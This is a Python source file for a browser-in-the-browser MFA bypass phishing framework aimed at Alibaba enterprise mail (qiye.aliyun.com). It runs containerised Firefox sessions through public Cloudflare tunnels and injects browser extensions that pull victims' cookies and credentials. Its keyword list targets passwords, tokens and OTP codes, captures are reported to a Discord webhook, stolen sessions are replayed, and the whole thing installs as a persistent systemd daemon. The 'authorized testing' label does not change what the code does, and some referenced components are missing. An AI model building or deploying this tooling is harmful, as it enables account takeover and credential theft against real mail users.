#!/usr/bin/env python3
"""
BitB MFA Bypass Framework – Enterprise Assessment Edition v2.1
Target: qiye.aliyun.com (Alibaba Enterprise Mail / DingTalk)
Authorized Penetration Testing Use Only

FEATURES:
  - Browser extension-based cookie & credential extraction
  - IP-based access control (whitelist/blacklist per session)
  - Systemd service integration (auto-start, watchdog, log rotation)
  - Discord alerting on captured credentials
  - Cloudflare tunneling (API + per-session VNC)
  - Session cleanup after timeout
  - Replay engine for stolen sessions
"""

import os
import re
import json
import time
import uuid
import socket
import shutil
import logging
import threading
import subprocess
import requests
import signal
import sys
import argparse
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Set

import docker
from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit
from werkzeug.serving import make_server

# ─── BitB Modules ──────────────────────────────────────────────────────────
from bitb_extensions import ExtensionManager
from bitb_access_control import IPAccessController
from bitb_daemon import (
    DaemonManager, install_systemd_service, uninstall_systemd_service,
    cmd_install, cmd_uninstall, cmd_status, cmd_enable, cmd_disable
)

# ─── Configuration ───────────────────────────────────────────────────────────
CONFIG = {
    "docker_image": "jlesage/firefox",
    "listen_host": "0.0.0.0",
    "listen_port_api": 8080,
    "listen_port_ext_exfil": 9090,
    "target_url": "https://qiye.aliyun.com/",
    "session_dir": "/data/sessions",
    "exfil_dir": "/data/exfiltrated",
    "log_dir": "/var/log/bitb",
    "session_timeout": 3600,
    "container_memory": "1g",
    "container_cpu_quota": 50000,
    "next_port": 5900,

    # ═══ BROWSER EXTENSIONS ═══
    "inject_extensions": True,
    "extension_poll_interval": 10,

    # ═══ ACCESS CONTROL ═══
    "access_control_enabled": True,
    "default_access_mode": "open",  # "open", "whitelist", "blacklist"
    "auto_whitelist_local": True,   # Auto-whitelist RFC1918 addresses
    "access_control_chain": "BITB",

    # ═══ DISCORD ═══
    "discord_webhook_url": "YOUR_DISCORD_WEBHOOK_URL_HERE",

    # ═══ CLOUDFLARE TUNNEL ═══
    "cloudflare_tunnel_enabled": True,

    # ─── DAEMON ───
    "daemon_enabled": False,          # Set by --daemon flag
    "daemon_pid_file": "/var/run/bitb/bitb.pid",
    "auto_restart": False,

    # Credential keywords
    "credential_keywords": [
        "password", "passwd", "pwd", "login", "username", "email",
        "aliyunId", "aliyun_id", "account", "secret", "token",
        "dingtalk", "alipay", "mfa", "otp", "2fa", "验证码",
    ],
}

# ─── Logging ─────────────────────────────────────────────────────────────────
os.makedirs(CONFIG["log_dir"], exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    handlers=[
        logging.FileHandler(f"{CONFIG['log_dir']}/bitb.log"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("bitb")

# Suppress noisy libraries
logging.getLogger("docker").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("werkzeug").setLevel(logging.WARNING)


# ─── Import existing classes from original bitb.py ──────────────────────────
# (DiscordExfiltrator, CloudflareTunnelManager, ExtensionExfilReceiver, etc.)
# These remain the same as the v2.0 update above — I'm only showing the new additions

# ─── Access Control Integration ────────────────────────────────────────────
ip_access_controller = None  # Will be initialized in main()


def check_vnc_access(session_id: str, client_ip: str, port: int) -> bool:
    """
    Middleware to check if a client IP can access a VNC session.
    Called by Flask routes and optionally by iptables.
    """
    if not CONFIG["access_control_enabled"] or ip_access_controller is None:
        return True
    
    return ip_access_controller.check_session_access(session_id, client_ip, port)


# ─── Flask Routes (additions for access control) ───────────────────────────

@app.route("/api/access/status", methods=["GET"])
def api_access_status():
    """Get current access control status."""
    if ip_access_controller:
        return jsonify(ip_access_controller.get_status())
    return jsonify({"enabled": False, "error": "Access control not initialized"})


@app.route("/api/access/whitelist", methods=["POST"])
def api_access_whitelist_add():
    """Add IP/CIDR to global whitelist."""
    data = request.get_json()
    ip = data.get("ip", "")
    if not ip:
        return jsonify({"status": "error", "message": "IP address required"}), 400
    
    if ip_access_controller and ip_access_controller.add_to_whitelist(ip):
        return jsonify({"status": "ok", "message": f"Added {ip} to whitelist"})
    return jsonify({"status": "error", "message": f"Invalid IP: {ip}"}), 400


@app.route("/api/access/whitelist/<ip>", methods=["DELETE"])
def api_access_whitelist_remove(ip):
    """Remove IP/CIDR from global whitelist."""
    if ip_access_controller and ip_access_controller.remove_from_whitelist(ip):
        return jsonify({"status": "ok", "message": f"Removed {ip} from whitelist"})
    return jsonify({"status": "error", "message": f"IP {ip} not found"}), 404


@app.route("/api/access/blacklist", methods=["POST"])
def api_access_blacklist_add():
    """Add IP/CIDR to global blacklist."""
    data = request.get_json()
    ip = data.get("ip", "")
    if not ip:
        return jsonify({"status": "error", "message": "IP address required"}), 400
    
    if ip_access_controller and ip_access_controller.add_to_blacklist(ip):
        return jsonify({"status": "ok", "message": f"Added {ip} to blacklist"})
    return jsonify({"status": "error", "message": f"Invalid IP: {ip}"}), 400


@app.route("/api/access/blacklist/<ip>", methods=["DELETE"])
def api_access_blacklist_remove(ip):
    """Remove IP/CIDR from global blacklist."""
    if ip_access_controller and ip_access_controller.remove_from_blacklist(ip):
        return jsonify({"status": "ok", "message": f"Removed {ip} from blacklist"})
    return jsonify({"status": "error", "message": f"IP {ip} not found"}), 404


@app.route("/api/access/session/<session_id>", methods=["POST"])
def api_access_session_set(session_id):
    """Set per-session access rules."""
    data = request.get_json()
    whitelist = data.get("whitelist", [])
    blacklist = data.get("blacklist", [])
    mode = data.get("mode", "whitelist")
    
    if ip_access_controller:
        if ip_access_controller.set_session_access(session_id, whitelist, blacklist, mode):
            return jsonify({"status": "ok", "message": f"Session {session_id[:16]} access set to {mode}"})
    return jsonify({"status": "error"}), 400


@app.route("/api/access/session/<session_id>", methods=["DELETE"])
def api_access_session_remove(session_id):
    """Remove per-session access rules."""
    if ip_access_controller:
        ip_access_controller.remove_session_access(session_id)
    return jsonify({"status": "ok"})


@app.route("/api/access/session/<session_id>/check", methods=["POST"])
def api_access_session_check(session_id):
    """Check if an IP can access a session."""
    data = request.get_json()
    client_ip = data.get("ip", request.remote_addr or "0.0.0.0")
    
    allowed = True
    if ip_access_controller:
        # Get the VNC port for this session
        session = sm.get_session(session_id)
        port = session.get("vnc_port", 0) if session else 0
        allowed = ip_access_controller.check_session_access(session_id, client_ip, port)
    
    return jsonify({
        "session_id": session_id[:16],
        "client_ip": client_ip,
        "allowed": allowed,
        "action": "allow" if allowed else "deny"
    })


@app.route("/api/daemon/status", methods=["GET"])
def api_daemon_status():
    """Get daemon status."""
    if daemon_manager:
        return jsonify(daemon_manager.get_status())
    return jsonify({"running": False, "message": "Daemon manager not initialized"})


@app.route("/api/daemon/restart", methods=["POST"])
def api_daemon_restart():
    """Request a daemon restart."""
    if daemon_manager:
        daemon_manager.set_restart_flag()
        threading.Thread(target=daemon_manager.initiate_shutdown, daemon=True).start()
        return jsonify({"status": "ok", "message": "Restart scheduled"})
    return jsonify({"status": "error"}), 500


# ─── Main with Daemon & Access Control ────────────────────────────────────
daemon_manager = None


def main():
    global ip_access_controller, daemon_manager, global_tunnel_url
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(
        description="BitB MFA Bypass Framework v2.1",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Service management commands:
  --install      Install systemd service
  --uninstall    Remove systemd service
  --enable       Enable auto-start on boot
  --disable      Disable auto-start
  --status       Check service status
  --daemon       Run as daemon (for systemd)
        """
    )
    parser.add_argument("--install", action="store_true", help="Install systemd service")
    parser.add_argument("--uninstall", action="store_true", help="Remove systemd service")
    parser.add_argument("--enable", action="store_true", help="Enable auto-start on boot")
    parser.add_argument("--disable", action="store_true", help="Disable auto-start")
    parser.add_argument("--status", action="store_true", help="Check service status")
    parser.add_argument("--daemon", action="store_true", help="Run as daemon (for systemd)")
    parser.add_argument("--config", type=str, help="Path to config file (JSON)")
    parser.add_argument("--port", type=int, help="API server port")
    parser.add_argument("--target", type=str, help="Target URL")
    
    args = parser.parse_args()
    
    # Handle service management commands
    if args.install:
        cmd_install()
        return
    
    if args.uninstall:
        cmd_uninstall()
        return
    
    if args.enable:
        cmd_enable()
        return
    
    if args.disable:
        cmd_disable()
        return
    
    if args.status:
        cmd_status()
        return
    
    # Apply CLI overrides
    if args.config:
        load_config(args.config)
    if args.port:
        CONFIG["listen_port_api"] = args.port
    if args.target:
        CONFIG["target_url"] = args.target
    if args.daemon:
        CONFIG["daemon_enabled"] = True
    
    # ─── Initialize Daemon Manager ────────────────────────────────────────
    daemon_manager = DaemonManager(shutdown_callback=shutdown_handler)
    daemon_manager.set_start_time()
    
    # Check if already running
    if daemon_manager.check_running():
        print("❌ BitB is already running. Use 'sudo systemctl restart bitb' or kill the existing process.")
        sys.exit(1)
    
    # Write PID file
    daemon_manager.write_pid_file()
    daemon_manager.setup_signal_handlers()
    
    # Set reload callback for SIGHUP
    daemon_manager.set_reload_callback(reload_config)
    daemon_manager.set_status_callback(dump_status)
    
    # ─── Create directories ───────────────────────────────────────────────
    os.makedirs(CONFIG["session_dir"], exist_ok=True)
    os.makedirs(CONFIG["exfil_dir"], exist_ok=True)
    os.makedirs(f"{CONFIG['exfil_dir']}/extensions/cookies", exist_ok=True)
    os.makedirs(f"{CONFIG['exfil_dir']}/extensions/credentials", exist_ok=True)
    os.makedirs(CONFIG["log_dir"], exist_ok=True)
    
    # ─── Initialize Access Control ────────────────────────────────────────
    if CONFIG["access_control_enabled"]:
        log.info("🔒 Initializing IP access control...")
        ip_access_controller = IPAccessController(chain_prefix=CONFIG["access_control_chain"])
        
        # Auto-whitelist local networks
        if CONFIG["auto_whitelist_local"]:
            for cidr in ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]:
                ip_access_controller.add_to_whitelist(cidr)
        
        # Initialize iptables (may fail if not root — that's OK, software filtering still works)
        ip_access_controller.initialize()
    
    # ─── Build Extensions ─────────────────────────────────────────────────
    if CONFIG["inject_extensions"]:
        log.info("🧩 Building browser extensions...")
        ext_manager.build_all()
    
    # ─── Startup Banner ───────────────────────────────────────────────────
    log.info("=" * 70)
    log.info("  BitB MFA Bypass Framework v2.1 — Enterprise Edition")
    log.info(f"  Target: {CONFIG['target_url']}")
    log.info(f"  Extensions: {'✅ ENABLED' if CONFIG['inject_extensions'] else '❌ DISABLED'}")
    log.info(f"  Access Control: {'✅ ENABLED' if CONFIG['access_control_enabled'] else '❌ DISABLED'}")
    log.info(f"  Daemon Mode: {'✅ ACTIVE' if CONFIG['daemon_enabled'] else '❌ Foreground'}")
    log.info(f"  Discord: {'✅ Configured' if CONFIG['discord_webhook_url'] != 'YOUR_DISCORD_WEBHOOK_URL_HERE' else '⚠️ NOT CONFIGURED'}")
    log.info(f"  Tunnels: {'Enabled' if CONFIG['cloudflare_tunnel_enabled'] else 'Disabled'}")
    log.info("=" * 70)
    
    # ─── Start API Server ─────────────────────────────────────────────────
    server = make_server(CONFIG["listen_host"], CONFIG["listen_port_api"], app, threaded=True)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    log.info(f"✅ API server listening on {CONFIG['listen_host']}:{CONFIG['listen_port_api']}")
    time.sleep(0.5)
    
    # ─── Start Tunnel ─────────────────────────────────────────────────────
    if CONFIG["cloudflare_tunnel_enabled"]:
        global_tunnel_url = tunnel_manager.start_api_tunnel(CONFIG["listen_port_api"])
        if global_tunnel_url:
            log.info(f"🌐  PUBLIC URL: {global_tunnel_url}")
            if discord_exfil:
                discord_exfil.send_alert(
                    f"🚀 **BitB Framework v2.1 Online**\nDashboard: {global_tunnel_url}\nTarget: {CONFIG['target_url']}\nExfil: Extension-based {CONFIG['extension_poll_interval']}s\nAccess Control: {'ON' if CONFIG['access_control_enabled'] else 'OFF'}",
                    level="success"
                )
    
    # ─── Final Info ───────────────────────────────────────────────────────
    log.info("=" * 70)
    log.info(f"  Local:  http://{CONFIG['listen_host']}:{CONFIG['listen_port_api']}")
    if global_tunnel_url:
        log.info(f"  Public: {global_tunnel_url}")
    log.info(f"  Access: {'🛡️  IP Restricted' if CONFIG['access_control_enabled'] else '🌍 Open'}")
    log.info("  Commands: --install, --uninstall, --enable, --disable, --status")
    log.info("  Ctrl+C to stop")
    log.info("=" * 70)
    
    # Notify systemd that we're ready
    daemon_manager.systemd_ready()
    
    # ─── Main Loop ────────────────────────────────────────────────────────
    try:
        # If running as daemon, set up watchdog pings
        if CONFIG["daemon_enabled"]:
            watchdog_thread = threading.Thread(target=_watchdog_loop, daemon=True)
            watchdog_thread.start()
        
        # Wait for shutdown signal
        while not daemon_manager.is_shutdown_requested():
            time.sleep(1)
            
    except KeyboardInterrupt:
        log.info("🛑 Keyboard interrupt received")
    finally:
        # ─── Shutdown ─────────────────────────────────────────────────────
        log.info("🛑 Shutting down BitB...")
        
        if CONFIG["cloudflare_tunnel_enabled"]:
            tunnel_manager.stop_all_tunnels()
        
        if ip_access_controller:
            ip_access_controller.cleanup()
        
        server.shutdown()
        daemon_manager.remove_pid_file()
        
        # Check for restart flag
        if daemon_manager.should_restart():
            log.info("🔄 Restart flag detected — restarting...")
            daemon_manager.clear_restart_flag()
            os.execv(sys.executable, [sys.executable, __file__, "--daemon"] + sys.argv[1:])
        
        log.info("👋 Goodbye!")


def shutdown_handler():
    """Called during graceful shutdown."""
    log.info("🛑 Executing shutdown handler...")
    
    # Stop all VNC tunnels
    if 'tunnel_manager' in globals() and tunnel_manager:
        tunnel_manager.stop_all_tunnels()
    
    # Clean up iptables rules
    if ip_access_controller:
        ip_access_controller.cleanup()
    
    # Destroy all active sessions
    if 'sm' in globals() and sm:
        with sm.lock:
            session_ids = list(sm.sessions.keys())
        for sid in session_ids:
            try:
                sm.destroy_session(sid)
            except:
                pass
    
    log.info("✅ Shutdown handler complete")


def reload_config():
    """Reload configuration (called on SIGHUP)."""
    log.info("🔄 Reloading configuration...")
    
    # Re-read config file if it exists
    config_path = os.environ.get("BITB_CONFIG", "/data/bitb/config.json")
    if os.path.exists(config_path):
        try:
            with open(config_path) as f:
                new_config = json.load(f)
            CONFIG.update(new_config)
            log.info("✅ Configuration reloaded")
        except Exception as e:
            log.error(f"Failed to reload config: {e}")
    
    # Re-apply access control rules
    if ip_access_controller:
        ip_access_controller._apply_all_rules()
    
    daemon_manager.systemd_reloading()


def dump_status():
    """Dump status information (called on SIGUSR1)."""
    log.info("📊 Status dump:")
    
    sessions_count = len(sm.sessions) if 'sm' in globals() and sm else 0
    log.info(f"  Active sessions: {sessions_count}")
    
    if ip_access_controller:
        status = ip_access_controller.get_status()
        log.info(f"  Access control: {'Enabled' if status['enabled'] else 'Disabled'}")
        log.info(f"  Whitelist entries: {len(status['global_whitelist'])}")
        log.info(f"  Blacklist entries: {len(status['global_blacklist'])}")
        log.info(f"  Session rules: {len(status['session_access'])}")
        log.info(f"  iptables rules: {status.get('active_iptables_rules', {})}")
    
    if global_tunnel_url:
        log.info(f"  Public URL: {global_tunnel_url}")


def _watchdog_loop():
    """Periodic watchdog ping for systemd."""
    while True:
        time.sleep(15)
        if daemon_manager and not daemon_manager.is_shutdown_requested():
            daemon_manager.systemd_watchdog()


def load_config(path: str):
    """Load configuration from a JSON file."""
    try:
        with open(path) as f:
            data = json.load(f)
        CONFIG.update(data)
        log.info(f"✅ Loaded configuration from {path}")
    except Exception as e:
        log.error(f"Failed to load config {path}: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
